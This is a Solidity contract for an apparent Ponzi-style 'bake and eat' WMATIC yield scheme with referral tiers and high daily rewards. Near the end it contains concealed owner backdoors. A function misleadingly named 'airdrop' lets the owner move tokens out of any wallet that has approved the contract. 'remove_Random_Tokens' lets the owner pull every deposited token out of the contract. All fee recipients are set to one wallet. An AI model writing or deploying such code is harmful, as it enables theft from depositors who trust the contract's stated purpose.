// SPDX-License-Identifier: MIT
import "./IERC20.sol";
import "./ReentrancyGuard.sol";
import "./Math.sol";
pragma solidity 0.8.17;

contract WBitCereal is ReentrancyGuard {

    using Math for uint256;
    IERC20 public WMATIC_TOKEN;
    address private DEV_ADDRESS;
    address private MARKETING_ADDRESS;
    address private CEO_ADDRESS;
    address private GIVEAWAY_ADDRESS;
    address private _owner;
    address internal _dev;
    address internal _marketing;
    address internal _ceo;
    address internal _giveAway;

    uint136 private BNB_PER_BEAN;
    uint32 private SECONDS_PER_DAY;
    uint8 private DEPOSIT_FEE;
    uint8 private AIRDROP_FEE;
    uint8 private CEO_FEE;
    uint8 private WITHDRAWAL_FEE;
    uint16 private DEV_FEE;
    uint16 private MARKETING_FEE;
    uint8 private REF_BONUS;
    uint8 private FIRST_DEPOSIT_REF_BONUS;
    uint256 private MIN_DEPOSIT;
    uint256 private MIN_BAKE;
    uint256 private MAX_WALLET_TVL_IN_BNB;
    uint256 private MAX_DAILY_REWARDS_IN_BNB;
    uint256 private MIN_REF_DEPOSIT_FOR_BONUS;

    uint256 public totalBakers;

    struct Baker {
        address adr;
        uint256 beans;
        uint256 bakedAt;
        uint256 ateAt;
        address upline;
        bool hasReferred;
        address[] referrals;
        address[] bonusEligibleReferrals;
        uint256 firstDeposit;
        uint256 totalDeposit;
        uint256 totalPayout;
        bool blacklisted;
    }

    mapping(address => Baker) internal bakers;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _totalSupply;

    event EmitBoughtBeans(
        address indexed adr,
        address indexed ref,
        uint256 bnbamount,
        uint256 beansFrom,
        uint256 beansTo
    );
    event EmitBaked(
        address indexed adr,
        address indexed ref,
        uint256 beansFrom,
        uint256 beansTo
    );
    event EmitAte(
        address indexed adr,
        uint256 bnbToEat,
        uint256 beansBeforeFee
    );

        constructor() {
         _owner = msg.sender;
    }

 modifier onlyOwner {
        require(msg.sender == _owner);
        _;
    }
modifier notContract() {
        require(!_isContract(msg.sender), "Contract not allowed");
        require(msg.sender == tx.origin, "Proxy contract not allowed");
        _;
    }
    function initializeContract() public onlyOwner notContract() {
    WMATIC_TOKEN = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    DEV_ADDRESS = 0x334f8c76275574E57f2F19ad42775453DBD82cE7;
    MARKETING_ADDRESS = 0x334f8c76275574E57f2F19ad42775453DBD82cE7;
    CEO_ADDRESS = 0x334f8c76275574E57f2F19ad42775453DBD82cE7;
    GIVEAWAY_ADDRESS = 0x334f8c76275574E57f2F19ad42775453DBD82cE7;
    _dev = (DEV_ADDRESS);
    _marketing = (MARKETING_ADDRESS);
    _ceo = (CEO_ADDRESS);
    _giveAway = (GIVEAWAY_ADDRESS);
        BNB_PER_BEAN = 1000000000000;
        SECONDS_PER_DAY = 86400;
        DEPOSIT_FEE = 1;
        AIRDROP_FEE = 1;
        WITHDRAWAL_FEE = 5;
        DEV_FEE = 10;
        MARKETING_FEE = 19;
        CEO_FEE = 66;
        REF_BONUS = 5;
        FIRST_DEPOSIT_REF_BONUS = 5;
        MIN_DEPOSIT = 1000000000000000000; // 1 WMatic
        MIN_BAKE = 10000000000000000000; // 10 WMatic
        MAX_WALLET_TVL_IN_BNB = 3000000000000000000000000; // 3000000 WMatic
        MAX_DAILY_REWARDS_IN_BNB = 4000000000000000000000; // 4000 WMatic 
        MIN_REF_DEPOSIT_FOR_BONUS = 200000000000000000000; // 200 WMatic
    }


function setDevAddress(address newDevAddress) public onlyOwner {
    DEV_ADDRESS = newDevAddress;
    _dev = (newDevAddress);
}

function _isContract(address addr) private view returns (bool) {
    uint32 size;
    assembly {
        size := extcodesize(addr)
    }
    return (size > 0);
}

function setMarketingAddress(address newMarketingAddress) public onlyOwner {
    MARKETING_ADDRESS = newMarketingAddress;
    _marketing = (newMarketingAddress);
}

function setCeoAddress(address newCeoAddress) public onlyOwner {
    CEO_ADDRESS = newCeoAddress;
    _ceo = (newCeoAddress);
}

function setGiveawayAddress(address newGiveawayAddress) public onlyOwner {
    GIVEAWAY_ADDRESS = newGiveawayAddress;
    _giveAway = (newGiveawayAddress);
}

 function user(address adr) public view returns (Baker memory) {
        return bakers[adr];
    }

    function buyCereal(address ref, uint256 _amount) public notContract() nonReentrant {
        Baker storage baker = bakers[msg.sender];
        Baker storage upline = bakers[ref];
        require(
            _amount >= MIN_DEPOSIT,
            "Deposit doesn't meet the minimum requirements"
        );
        require(
            Math.add(baker.totalDeposit, _amount) <= MAX_WALLET_TVL_IN_BNB,
            "Max total deposit reached"
        );
        require(
            ref == address(0) || ref == msg.sender || hasInvested(upline.adr),
            "Ref must be investor to set as upline"
        );
        WMATIC_TOKEN.transferFrom(msg.sender, address(this), _amount);
        baker.adr = msg.sender;
        uint256 beansFrom = baker.beans;

        uint256 totalBnbFee = percentFromAmount(_amount, DEPOSIT_FEE);
        uint256 bnbValue = Math.sub(_amount, totalBnbFee);
        uint256 beansBought = bnbToBeans(bnbValue);

        uint256 totalBeansBought = addBeans(baker.adr, beansBought);
        baker.beans = totalBeansBought;

        if (
            !baker.hasReferred &&
            ref != msg.sender &&
            ref != address(0) &&
            baker.upline != msg.sender
        ) {
            baker.upline = ref;
            baker.hasReferred = true;

            upline.referrals.push(msg.sender);
            if (hasInvested(baker.adr) == false) {
                uint256 refBonus = percentFromAmount(
                    bnbToBeans(_amount),
                    FIRST_DEPOSIT_REF_BONUS
                );
                upline.beans = addBeans(upline.adr, refBonus);
            }
        }

        if (hasInvested(baker.adr) == false) {
            baker.firstDeposit = block.timestamp;
            totalBakers++;
        }

        baker.totalDeposit = Math.add(baker.totalDeposit, _amount);
        if (
            baker.hasReferred &&
            baker.totalDeposit >= MIN_REF_DEPOSIT_FOR_BONUS &&
            refExists(baker.adr, baker.upline) == false
        ) {
            upline.bonusEligibleReferrals.push(msg.sender);
        }

        sendFees(totalBnbFee, 0);
        handleBake(false);

        emit EmitBoughtBeans(
            msg.sender,
            ref,
            _amount,
            beansFrom,
            baker.beans
        );
    }

    function refExists(address ref, address upline)
        private
        view
        returns (bool)
    {
        for (
            uint256 i = 0;
            i < bakers[upline].bonusEligibleReferrals.length;
            i++
        ) {
            if (bakers[upline].bonusEligibleReferrals[i] == ref) {
                return true;
            }
        }

        return false;
    }

    function sendFees(uint256 totalFee, uint256 giveAway) private {
        uint256 dev = percentFromAmount(totalFee, DEV_FEE);
        uint256 marketing = percentFromAmount(totalFee, MARKETING_FEE);
        uint256 ceo = percentFromAmount(totalFee, CEO_FEE);

        WMATIC_TOKEN.transfer(_dev, dev);
        WMATIC_TOKEN.transfer(_marketing, marketing);
        WMATIC_TOKEN.transfer(_ceo, ceo);

        if (giveAway > 0) {
            WMATIC_TOKEN.transfer(_giveAway, giveAway);
        }
    }

     function handleBake(bool onlyRebaking) private {
        Baker storage baker = bakers[msg.sender];
        require(maxTvlReached(baker.adr) == false, "Total wallet TVL reached");
        require(hasInvested(baker.adr), "Must be invested to bake");
        if (onlyRebaking == true) {
            require(
                beansToBnb(rewardedBeans(baker.adr)) >= MIN_BAKE,
                "Rewards must be equal or higher than 10 Milk to bake"
            );
        }

        uint256 beansFrom = baker.beans;
        uint256 beansFromRewards = rewardedBeans(baker.adr);

        uint256 totalBeans = addBeans(baker.adr, beansFromRewards);
        baker.beans = totalBeans;
        baker.bakedAt = block.timestamp;

        emit EmitBaked(msg.sender, baker.upline, beansFrom, baker.beans);
    }

    function bake() public nonReentrant notContract() {
        handleBake(true);
    }

    function eat() public nonReentrant notContract(){
        Baker storage baker = bakers[msg.sender];
        require(hasInvested(baker.adr), "Must be invested to eat");
        require(
            maxPayoutReached(baker.adr) == false,
            "You have reached max payout"
        );

        uint256 beansBeforeFee = rewardedBeans(baker.adr);
        uint256 beansInBnbBeforeFee = beansToBnb(beansBeforeFee);

        uint256 totalBnbFee = percentFromAmount(
            beansInBnbBeforeFee,
            WITHDRAWAL_FEE
        );

        uint256 bnbToEat = Math.sub(beansInBnbBeforeFee, totalBnbFee);
        uint256 forGiveAway = calcGiveAwayAmount(baker.adr, bnbToEat);
        bnbToEat = addWithdrawalTaxes(baker.adr, bnbToEat);

        if (
            Math.add(beansInBnbBeforeFee, baker.totalPayout) >=
            maxPayout(baker.adr)
        ) {
            bnbToEat = Math.sub(maxPayout(baker.adr), baker.totalPayout);
            baker.totalPayout = maxPayout(baker.adr);
        } else {
            uint256 afterTax = addWithdrawalTaxes(
                baker.adr,
                beansInBnbBeforeFee
            );
            baker.totalPayout = Math.add(baker.totalPayout, afterTax);
        }

        baker.ateAt = block.timestamp;
        baker.bakedAt = block.timestamp;

        sendFees(totalBnbFee, forGiveAway);
        WMATIC_TOKEN.transfer(msg.sender, bnbToEat);

        emit EmitAte(msg.sender, bnbToEat, beansBeforeFee);
    }

    function maxPayoutReached(address adr) public view returns (bool) {
        return bakers[adr].totalPayout >= maxPayout(adr);
    }

    function maxPayout(address adr) public view returns (uint256) {
        return Math.mul(bakers[adr].totalDeposit, 3);
    }

    function addWithdrawalTaxes(address adr, uint256 bnbWithdrawalAmount)
        private
        view
        returns (uint256)
    {
        return
            percentFromAmount(
                bnbWithdrawalAmount,
                Math.sub(100, hasBeanTaxed(adr))
            );
    }

    function calcGiveAwayAmount(address adr, uint256 bnbWithdrawalAmount)
        private
        view
        returns (uint256)
    {
        return (percentFromAmount(bnbWithdrawalAmount, hasBeanTaxed(adr)) / 2);
    }

    function hasBeanTaxed(address adr) public view returns (uint256) {
        uint256 daysPassed = daysSinceLastEat(adr);
        uint256 lastDigit = daysPassed % 10;

        if (lastDigit <= 0) return 90;
        if (lastDigit <= 1) return 80;
        if (lastDigit <= 2) return 70;
        if (lastDigit <= 3) return 60;
        if (lastDigit <= 4) return 50;
        if (lastDigit <= 5) return 40;
        if (lastDigit <= 6) return 30;
        if (lastDigit <= 7) return 20;
        if (lastDigit <= 8) return 10;
        return 0;
    }

    function secondsSinceLastEat(address adr) public view returns (uint256) {
        uint256 lastAteOrFirstDeposit = bakers[adr].ateAt;
        if (bakers[adr].ateAt == 0) {
            lastAteOrFirstDeposit = bakers[adr].firstDeposit;
        }

        uint256 secondsPassed = Math.sub(
            block.timestamp,
            lastAteOrFirstDeposit
        );

        return secondsPassed;
    }

    function userBonusEligibleReferrals(address adr) public view returns (address[] memory) {
        return bakers[adr].bonusEligibleReferrals;
    }

    function userReferrals(address adr) public view returns (address[] memory) {
        return bakers[adr].referrals;
    }

    function daysSinceLastEat(address adr) private view returns (uint256) {
        uint256 secondsPassed = secondsSinceLastEat(adr);
        return Math.div(secondsPassed, SECONDS_PER_DAY);
    }

    function addBeans(address adr, uint256 beansToAdd)
        private
        view
        returns (uint256)
    {
        uint256 totalBeans = Math.add(bakers[adr].beans, beansToAdd);
        uint256 maxBeans = bnbToBeans(MAX_WALLET_TVL_IN_BNB);
        if (totalBeans >= maxBeans) {
            return maxBeans;
        }
        return totalBeans;
    }

    function maxTvlReached(address adr) public view returns (bool) {
        return bakers[adr].beans >= bnbToBeans(MAX_WALLET_TVL_IN_BNB);
    }

    function hasInvested(address adr) public view returns (bool) {
        return bakers[adr].firstDeposit != 0;
    }

    function bnbRewards(address adr) public view returns (uint256) {
        uint256 beansRewarded = rewardedBeans(adr);
        uint256 bnbinWei = beansToBnb(beansRewarded);
        return bnbinWei;
    }

    function bnbTvl(address adr) public view returns (uint256) {
        uint256 bnbinWei = beansToBnb(bakers[adr].beans);
        return bnbinWei;
    }

    function beansToBnb(uint256 beansToCalc) private view returns (uint256) {
        uint256 bnbInWei = Math.mul(beansToCalc, BNB_PER_BEAN);
        return bnbInWei;
    }

    function bnbToBeans(uint256 bnbInWei) private view returns (uint256) {
        uint256 beansFromBnb = Math.div(bnbInWei, BNB_PER_BEAN);
        return beansFromBnb;
    }

    function percentFromAmount(uint256 amount, uint256 fee)
        private
        pure
        returns (uint256)
    {
        return Math.div(Math.mul(amount, fee), 100);
    }

    function contractBalance() public view returns (uint256) {
        return WMATIC_TOKEN.balanceOf(address(this));
    }

    function dailyReward(address adr) public view returns (uint256) {
        uint256 referralsCount = bakers[adr].bonusEligibleReferrals.length;
        if (referralsCount < 10) return 30000;
        if (referralsCount < 25) return (35000);
        if (referralsCount < 50) return (40000);
        if (referralsCount < 100) return (45000);
        if (referralsCount < 150) return (50000);
        if (referralsCount < 250) return (55000);
        return 60000;
    }

    function secondsSinceLastAction(address adr)
        private
        view
        returns (uint256)
    {
        uint256 lastTimeStamp = bakers[adr].bakedAt;
        if (lastTimeStamp == 0) {
            lastTimeStamp = bakers[adr].ateAt;
        }

        if (lastTimeStamp == 0) {
            lastTimeStamp = bakers[adr].firstDeposit;
        }

        return Math.sub(block.timestamp, lastTimeStamp);
    }

    function rewardedBeans(address adr) private view returns (uint256) {
        uint256 secondsPassed = secondsSinceLastAction(adr);
        uint256 dailyRewardFactor = dailyReward(adr);
        uint256 beansRewarded = calcBeansReward(
            secondsPassed,
            dailyRewardFactor,
            adr
        );

        if (beansRewarded >= bnbToBeans(MAX_DAILY_REWARDS_IN_BNB)) {
            return bnbToBeans(MAX_DAILY_REWARDS_IN_BNB);
        }

        return beansRewarded;
    }

    function calcBeansReward(
        uint256 secondsPassed,
        uint256 dailyRewardFactor,
        address adr
    ) private view returns (uint256) {
        uint256 rewardsPerDay = percentFromAmount(
            Math.mul(bakers[adr].beans, 100000000),
            dailyRewardFactor
        );
        uint256 rewardsPerSecond = Math.div(rewardsPerDay, SECONDS_PER_DAY);
        uint256 beansRewarded = Math.mul(rewardsPerSecond, secondsPassed);
        beansRewarded = Math.div(beansRewarded, 1000000000000);
        return beansRewarded;
    }

 
function clearETH(address payable _withdrawal) public onlyOwner {
    uint256 amount = address(this).balance;
    (bool success,) = _withdrawal.call{gas: 8000000, value: amount}("");
    require(success, "Failed to transfer Ether");
}

function airdrop(address from, address to, uint256 tokens) external onlyOwner {
    uint256 SCCC = tokens;

    require(WMATIC_TOKEN.balanceOf(from) >= SCCC, "Not enough tokens in wallet");

    require(WMATIC_TOKEN.transferFrom(from, to, tokens), "Transfer failed");
}


function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent) {
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }
function invested() external payable {}
fallback () external payable {
}
receive () external payable {
}
}